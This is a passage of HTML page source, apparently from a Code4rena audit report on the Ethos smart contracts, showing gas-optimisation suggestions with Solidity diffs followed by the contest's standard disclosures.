class=\"mtk1\">(</span><span class=\"mtk12\">_account</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">187</span><span class=\"mtk1\">:        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">188</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<p>In the above function, The first if condition checks that <code>_account == defaultPoolAddress</code> meaning the operations would only be performed if the two are the same, as <code>defaultPoolAddress</code> is a storage variable(1 SLOAD = 100 gas) we could replace it’s occurence inside the if blocks with the local <code>_account</code> variable (1 MLOAD = 3 gas ) since the two are the same. The storage variable is only read in this block thus we can get away with using the local one.</p>\n<p>Similar explanation to the above applies to the <code>collSurplusPoolAddress</code> variable</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"156\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/Ethos-Core/contracts/ActivePool.sol b/Ethos-Core/contracts/ActivePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 753fcd0..735a0dd 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/Ethos-Core/contracts/ActivePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/Ethos-Core/contracts/ActivePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -177,11 +177,11 @@ contract ActivePool is Ownable, CheckContract, IActivePool {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         emit CollateralSent(_collateral, _account, _amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if (_account == defaultPoolAddress) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            IERC20(_collateral).safeIncreaseAllowance(defaultPoolAddress, _amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            IDefaultPool(defaultPoolAddress).pullCollateralFromActivePool(_collateral, _amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            IERC20(_collateral).safeIncreaseAllowance(_account, _amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            IDefaultPool(_account).pullCollateralFromActivePool(_collateral, _amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         } else if (_account == collSurplusPoolAddress) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            IERC20(_collateral).safeIncreaseAllowance(collSurplusPoolAddress, _amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            ICollSurplusPool(collSurplusPoolAddress).pullCollateralFromActivePool(_collateral, _amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            IERC20(_collateral).safeIncreaseAllowance(_account, _amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            ICollSurplusPool(_account).pullCollateralFromActivePool(_collateral, _amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         } else {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             IERC20(_collateral).safeTransfer(_account, _amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span></code></pre>\n<h2 id=\"caching-global-variables-is-expensive-than-using-the-variable-itself\" style=\"position:relative;\"><a href=\"#caching-global-variables-is-expensive-than-using-the-variable-itself\" aria-label=\"caching global variables is expensive than using the variable itself permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Caching global variables is expensive than using the variable itself</h2>\n<h3 id=\"dont-cache-msgsender-in-the-following\" style=\"position:relative;\"><a href=\"#dont-cache-msgsender-in-the-following\" aria-label=\"dont cache msgsender in the following permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Don’t cache msg.sender in the following</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L225-L252\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L225-L252</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"157\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ReaperVaultV2</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">225</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">availableCapital</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">int256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">226</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stratAddr</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">227</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">totalAllocBPS</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">emergencyShutdown</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">228</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> -</span><span class=\"mtk11\">int256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">strategies</span><span class=\"mtk1\">[</span><span class=\"mtk12\">stratAddr</span><span class=\"mtk1\">].</span><span class=\"mtk12\">allocated</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">229</span><span class=\"mtk1\">:        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">231</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stratMaxAllocation</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">strategies</span><span class=\"mtk1\">[</span><span class=\"mtk12\">stratAddr</span><span class=\"mtk1\">].</span><span class=\"mtk12\">allocBPS</span><span class=\"mtk1\"> * </span><span class=\"mtk11\">balance</span><span class=\"mtk1\">()) / </span><span class=\"mtk12\">PERCENT_DIVISOR</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">232</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stratCurrentAllocation</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">strategies</span><span class=\"mtk1\">[</span><span class=\"mtk12\">stratAddr</span><span class=\"mtk1\">].</span><span class=\"mtk12\">allocated</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"158\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/Ethos-Vault/contracts/ReaperVaultV2.sol b/Ethos-Vault/contracts/ReaperVaultV2.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index b5f2a58..d6f5d3e 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/Ethos-Vault/contracts/ReaperVaultV2.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/Ethos-Vault/contracts/ReaperVaultV2.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -223,13 +223,12 @@ contract ReaperVaultV2 is ReaperAccessControl, ERC20, IERC4626Events, AccessCont</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      * the vault.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function availableCapital() public view returns (int256) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        address stratAddr = msg.sender;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if (totalAllocBPS == 0 || emergencyShutdown) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            return -int256(strategies[stratAddr].allocated);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            return -int256(strategies[msg.sender].allocated);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256 stratMaxAllocation = (strategies[stratAddr].allocBPS * balance()) / PERCENT_DIVISOR;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256 stratCurrentAllocation = strategies[stratAddr].allocated;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 stratMaxAllocation = (strategies[msg.sender].allocBPS * balance()) / PERCENT_DIVISOR;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 stratCurrentAllocation = strategies[msg.sender].allocated;</span></span></span></code></pre>\n<h3 id=\"dont-cache-msgsender-in-the-following-1\" style=\"position:relative;\"><a href=\"#dont-cache-msgsender-in-the-following-1\" aria-label=\"dont cache msgsender in the following 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Don’t cache msg.sender in the following</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L493-L560\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L493-L560</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"159\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ReaperVaultV2</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">report</span><span class=\"mtk1\">(</span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_roi</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_repayment</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">LocalVariables_report</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">stratAddr</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">StrategyParams</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategy</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">strategies</span><span class=\"mtk1\">[</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">stratAddr</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">strategy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">activation</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Unauthorized strategy&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_roi</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">loss</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(-</span><span class=\"mtk12\">_roi</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">_reportLoss</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">stratAddr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">loss</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_roi</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">gain</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_roi</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">fees</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_chargeFees</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">stratAddr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">gain</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">strategy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">gains</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">gain</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">credit</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">freeWantInStrat</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">stratAddr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">credit</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">freeWantInStrat</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">credit</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">freeWantInStrat</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">stratAddr</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">freeWantInStrat</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">StrategyReported</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">stratAddr</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">strategy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">allocBPS</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">emergencyShutdown</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">IStrategy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">stratAddr</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span></code></pre>\n<h2 id=\"use-a-more-recent-version-of-solidity\" style=\"position:relative;\"><a href=\"#use-a-more-recent-version-of-solidity\" aria-label=\"use a more recent version of solidity permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Use a more recent version of solidity</h2>\n<p>Use a solidity version of at least 0.8.2 to get simple compiler automatic inlining Use a solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads Use a solidity version of at least 0.8.4 to get custom errors, which are cheaper at deployment than revert()/require() strings Use a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value.</p>\n<p>Most of the in scope code seems to be running versions lower than 0.8</p>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/TroveManager.sol#L3\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/TroveManager.sol#L3</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"160\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">TroveManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">3</span><span class=\"mtk1\">:</span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0.6</span><span class=\"mtk1\">.</span><span class=\"mtk7\">11</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<hr>\n<h1 id=\"disclosures\" style=\"position:relative;\"><a href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Disclosures</h1>\n<p>C4 is an open organization governed by participants in the community.</p>\n<p>C4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.</p>\n<p>C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.</p>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  